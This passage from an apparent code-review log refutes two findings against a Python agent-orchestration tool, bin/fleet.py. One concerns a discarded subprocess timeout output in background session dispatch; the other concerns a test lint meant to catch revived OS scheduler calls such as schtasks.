hundreds-of-ms range, and a `fleet spawn <same-name>` is simultaneously parked in the lock queue having named a worker that was occupied when it was issued, the write could land inside the widened gap. That is not the filed failure scenario, and I could not construct a real operational sequence that produces it.

---

### R22 — dispatch_bg discards TimeoutExpired.stdout, throwing away the only handle to a possibly-live --bg session

- `bin/fleet.py:9751`  |  claimed **low**  |  dimension `native-substrate`

**Claim:** Under daemon load, `claude --bg` registers the session with the daemon and writes `backgrounded · 7c19f2ab · ...` to its (piped) stdout, then blocks before exiting. At 120s `subprocess.run` kills the CLI child; the daemon-side session is unaffected and keeps running the task file. `dispatch_bg` raises `--bg dispatch failed: Command ... timed out after 120 seconds` with `short_id=None`; `cmd_spawn`'s handler (3888) gets `fast_sid=None` from `_fast_completion_sid(name, pre_claim_at, short_id=None)` and pops the pre-claim record entirely (3921-3925), logging `spawn_failed` with no short id. The operator is told the spawn failed and has no id at all; the session bills to completion untracked, and a re-run of `fleet spawn` overwrites `state/tasks/<name>.md` out from under it.

**Refuted because:**

- *(confidence: high)* The mechanical claim is true (subprocess.run does populate TimeoutExpired.stdout on Windows -- I reproduced it -- and bin/fleet.py:9751-9752 discards it, raising with short_id=None), but the finding fails on both reachability and consequence.  REACHABILITY: The scenario requires `claude --bg` to register the session, print `backgrounded · <id> ·` to its piped stdout, and then block for >=120s. The repo's own live evidence contradicts this. bin/fleet.py:7120-7137 quotes the verbatim 2.1.216 capture of the daemon-overload/outage mode: the CLI prints "Couldn't reach the background service (background service did not become reachable within 45s)" and EXITS NONZERO at ~45s -- inside the 120s Python timeout, with no session registered and no short id printed. That is handled by the returncode branch at 9754-9789, not the timeout handler. Separately, docs/specs/native-substrate.md:149 (spike verdict G8) explicitly probed the "dispatch command hangs" hypothesis and recorded the opposite: "does not hang the *dispatch command* -- it returns normally with a `backgrounded · ...` line" while the spawned SESSION wedges. Every catalogued wedge in this codebase (dispatch_wedged, never-attach, DOA) is session-side, after the CLI exited 0. There is no observation anywhere in the repo of the CLI printing the id and then hanging.  CONSEQUENCE (decisive, code-verified not speculative): even granting the timeout, the proposed fix produces an identical outcome for the scenario as written. `_fast_completion_sid` (bin/fleet.py:9369-9440) only returns a sid when an outcome record with kind == "result" exists -- i.e. the worker already FINISHED a turn and the Stop hook wrote outcomes/<sid>.jsonl. The finding's own scenario has the session still "running the task file", so fast_sid is None with or without short_id, the pre-claim is popped identically (3921-3925), and state/tasks/<name>.md is just as re-writable. Moreover the DOA-rollback branch logs `append_event("spawn_failed", args.name, error=str(exc))` at 3925 with NO short_id kwarg -- unlike the BaseException branch at 3948-3949 which does pass short_id=_short_id_from_notes(exc) -- and raises FleetCliError(f"{name}: native spawn failed -- {exc}") whose timeout text carries no id. So passing short_id= on the exception would never reach the operator on this path. The stated harm ("the operator has no id at all") survives the proposed fix verbatim.  Additional Windows-specific condition: subprocess.run's timeout path does process.kill() then a second process.communicate() to drain; if the hung --bg invocation had started the daemon (the very condition the load scenario implies) and it inherited the pipe write handle, that drain does not see EOF and TimeoutExpired may never surface in bounded time.  The except (OSError, subprocess.SubprocessError) handler is reachable via OSError/exec failure, but the TimeoutExpired-with-a-parseable-short-id sub-case is unevidenced, contradicted by the recorded substrate behavior, and would yield no observable improvement if it occurred.
- *(confidence: high)* The mechanical half of the claim checks out: `subprocess.TimeoutExpired` IS a `SubprocessError`, and on Windows `subprocess.run` does populate `exc.stdout` (decoded, because text=True) before re-raising. Reproduced on this machine with py -3.13: `stdout repr 'backgrounded \xb7 7c19f2ab \xb7 ok\n'`. So bin/fleet.py:9753-9754 does discard a recoverable short id.  But the finding is refuted on impact — the reviewer misread what `NativeDispatchError.short_id` is FOR. I grepped every consumer of that attribute in bin/fleet.py: there are exactly three, and all three are the same call, `_fast_completion_sid(name, pre_claim_at, short_id=getattr(exc, "short_id", None))` at 3892 (cmd_spawn), 5534 (respawn), 13539. Nothing else ever reads it. It is never printed, never logged, never persisted. Per its own docstring (9369-9396), `short_id` there is purely a GLOB KEY for `outcomes_dir().glob("*.jsonl")` whose stem prefix-matches the sid — i.e. it can only find a file the **Stop hook already wrote**, which only exists if the session ALREADY COMPLETED (`_consider` further requires `rec.get("kind") == "result"`).  The finding's own scenario states the opposite: the daemon session "keeps running the task file" and "bills to completion untracked". In that state there is no outcome file, so `_fast_completion_sid` returns None with or without the short id. Every consequence the finding lists is therefore identical before and after the proposed fix: - `fast_sid` is None either way -> the pre-claim is popped either way (3926-3932 / 13555-13561); - the `spawn_failed` event carries no short id either way — line 3932 is `append_event("spawn_failed", args.name, error=str(exc))` and 13561 is the same; the NativeDispatchError branch never forwards `exc.short_id` to the event. (Only the *BaseException* branch logs an id, via `short_id=_short_id_from_notes(exc)` at 3957 — a different path.) - `state/tasks/<name>.md` is equally re-writable by a re-run.  So "the whole T4 short-id-preservation machinery is bypassed" is wrong: `_stash_short_id_note` (9809, not 9795) sits on the join phase AFTER a returncode-0 dispatch and is an operator-visible channel; `NativeDispatchError.short_id` is not an operator recovery handle at all, and `_report_stranded_native_turn`'s "sid/short_id are the ONLY recovery handles" comment (3385-3400) belongs to the post-join registry-stamp path, not this one.  The only state in which the proposed fix changes any observable behavior is a compound hypothetical the finding does not claim: the session both COMPLETES and its Stop hook writes `outcomes/<sid>.jsonl`, AND the `claude --bg` CLI child nonetheless stays alive past the 120 s `NATIVE_DISPATCH_TIMEOUT_SECONDS`. That is a missed-recovery nicety with no demonstrated scenario, not a defect. `tests/test_native.py:484 test_dispatch_timeout_raises` pins only that NativeDispatchError is raised, so nothing contradicts the fix — it is simply not load-bearing.

---

### R23 — Scheduler-retirement lint only rejects lines containing BOTH '(' and '='; a bare schtasks call passes

- `tests/test_autoclean.py:727`  |  claimed **low**  |  dimension `tests-quality`

**Claim:** A later wave revives the timer as `def _ensure_sweep_timer(name):` containing `return subprocess.run(["schtasks", "/Create", "/TN", name, "/SC", "HOURLY", "/TR", cmd])` -- no `=` on that line, a name not in RETIRED_NAMES, not a `_WindowsPlatform` method. Every test in `TestSchedulerSurfaceIsRetired` stays green while fleet installs machine-local OS-scheduler state again, which is precisely the surface the 2026-07-27 operator ruling retired after the 9h14m power-cut dropped a 6-hourly occurrence.

**Refuted because:**

- *(confidence: medium)* The mechanical claim reproduces, but it does not describe a defect in reachable code — it describes a defense-in-depth lint being narrower than its docstring.  VERIFIED (so I am not refuting on facts): I replicated `tests/test_autoclean.py:715-728` against the real `bin/fleet.py` and confirmed the `"(" in ln and "=" in ln` filter lets through `    return subprocess.run(["schtasks", "/Create", "/TN", name, "/SC", "HOURLY"])` (has `(`, no `=`) and `    cmd = ["schtasks", "/Create", "/TN", name]` (has `=`, no `(`), while catching `subprocess.run(["crontab", "-"], input=line)`. I also confirmed no other source-scan pin exists anywhere in `tests/` for these tokens, so the sibling tests are the only backstop.  Why I still refute:  1. NOTHING IS WRONG IN SHIPPED CODE. The retirement actually happened. The only occurrences of `schtasks|crontab|launchctl|systemd-run` in the entire repo outside this test are three prose lines: `bin/fleet.py:357` (a `#` comment about the deleted seam), `bin/fleet.py:445` (`_PosixPlatform` docstring), and `bin/fleet.py:9834` (a docstring simile, "a hung schtasks-style 30s x 3 stall"). `py -3.13 -m pytest -q tests/test_autoclean.py -k SchedulerSurface` → 24 passed. There is no scheduler call to reach, no install path, no machine-local state. The finding's own failure scenario opens with "A later wave revives the timer as `def _ensure_sweep_timer(name):`" — that is the "this could be a problem if someone later..." shape the review brief excludes, not a concrete input→wrong-outcome.  2. THE TEST IS NOT A TEST-THAT-CANNOT-FAIL. It is not vacuous: it demonstrably reds on the keyword-arg subprocess form. "Incomplete lint" and "test that cannot fail" are different categories, and only the latter is a reportable defect here.  3. ONE OF THE FOUR EVIDENCE ROWS IS WRONG. The finding lists `AUTOCLEAN_TASK_NAME = "schtasks-fleet-autoclean"` as passing clean and asserts "the sibling pins do not close it either." `AUTOCLEAN_TASK_NAME` is literally the first entry of `RETIRED_NAMES` at `tests/test_autoclean.py:683`, so `test_no_install_path_survives_in_the_module` fails on exactly that revival. The gap is narrower than presented.  4. THE OPERATOR-FACING SURFACE IS PINNED BEHAVIORALLY, NOT BY KEYWORD. `test_init_rejects_the_retired_flags` (`tests/test_autoclean.py:707-713`) requires `SystemExit` for `--autoclean`, `--autoclean-interval-hours`, `--autoclean-remove`, and `test_no_platform_backend_can_touch_a_scheduler` covers both `_WindowsPlatform` and `_PosixPlatform`. A revived timer that installs real OS state needs a trigger; a scheduler helper with no CLI flag and no platform-backend method is a much narrower slip than "every test stays green while fleet installs machine-local OS-scheduler state again."  The proposed `ast`-based fix is a reasonable hardening and I would not argue against merging it — but hardening an already-green guard against a hypothetical future edit is not a defect finding.

---

